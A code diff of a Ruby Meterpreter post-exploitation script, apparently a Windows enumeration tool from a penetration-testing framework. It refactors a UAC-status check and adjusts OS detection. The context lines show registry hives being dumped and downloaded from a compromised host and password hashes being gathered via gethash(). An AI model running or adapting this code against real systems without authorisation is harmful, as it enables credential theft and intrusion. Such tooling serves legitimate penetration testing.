@@ -424,7 +424,6 @@ def regdump(pathoflogs,filename)
 	host,port = @client.tunnel_peer.split(':')
 	#This variable will only contain garbage, it is to make sure that the channel is not closed while the reg is being dumped and compress
 	garbage = ''
-	windrtmp = ''
 	hives = %w{HKCU HKLM HKCC HKCR HKU}
 	windir = @client.fs.file.expand_path("%WinDir%")
 	print_status('Dumping and Downloading the Registry')
@@ -542,23 +541,12 @@ def migrate()
 end
 #---------------------------------------------------------------------------------------------------------
 #Function for Checking for UAC
-def uaccheck(winversion)
-	uac = false
-	if winversion['OS']=~ /^Windows (Vista|7)/
-		if @client.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
-			print_status("Checking if UAC is enabled ...")
-			key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
-			root_key, base_key = @client.sys.registry.splitkey(key)
-			value = "EnableLUA"
-			open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
-			v = open_key.query_value(value)
-			if v.data == 1
-				print_status("\tUAC is Enabled")
-				uac = true
-			else
-				print_status("\tUAC is Disabled")
-			end
-		end
+def uaccheck()
+	uac = is_uac_enabled?
+	if uac
+		print_status("\tUAC is Enabled")
+	else
+		print_status("\tUAC is Disabled")
 	end
 	file_local_write(@dest,"UAC is Enabled")
 	return uac
@@ -586,7 +574,7 @@ print_status("Output of each individual command is saved to #{@logfol}")
 file_local_write(@dest,header)
 file_local_write(@dest,chkvm())
 trgtos = info['OS']
-uac = uaccheck(info)
+uac = uaccheck()
 # Run Commands according to OS some commands are not available on all versions of Windows
 if trgtos =~ /(Windows XP)/
 	if trgtos =~ /(2600, \)|2600, Service Pack 1\))/
@@ -611,7 +599,7 @@ elsif trgtos =~ /(Windows 2008)/
 	else
 		gethash()
 	end
-elsif trgtos =~ /(Vista|7)/
+elsif trgtos =~ /(Windows Vista|7)/
 	list_exec(commands + vstwlancmd)
 	wmicexec(wmic)
 	findprogs()
